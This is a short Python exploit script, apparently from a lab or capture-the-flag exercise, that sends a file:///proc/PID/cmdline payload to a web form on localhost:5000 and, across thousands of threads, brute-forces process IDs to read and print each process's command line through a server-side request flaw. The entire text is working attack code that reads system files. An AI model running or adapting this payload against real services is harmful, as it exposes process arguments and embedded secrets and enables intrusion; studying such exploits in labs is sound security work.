import requests
import threading
import re

thread_list = []

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

def call(PID):
    url = "http://localhost:5000/"
    data = f"website_url=file:///proc/{PID}/cmdline"

    try:
        resp = requests.post(url, data=data, headers=headers, timeout=3)

        if not resp.text:
            return

        match = re.search(r"<div>(.*?)</div>", resp.text, re.DOTALL)
        if match and match.group(1).strip():
            print(f"[PID {PID}]")
            print(match.group(1).strip())
            print("-" * 50)

    except requests.exceptions.RequestException:
        pass  # silence connection errors (many PIDs won't exist)

# Create threads
for i in range(1, 5000):
    t = threading.Thread(target=call, args=(i,))
    t.start()
    thread_list.append(t)

# Join threads
for t in thread_list:
    t.join()
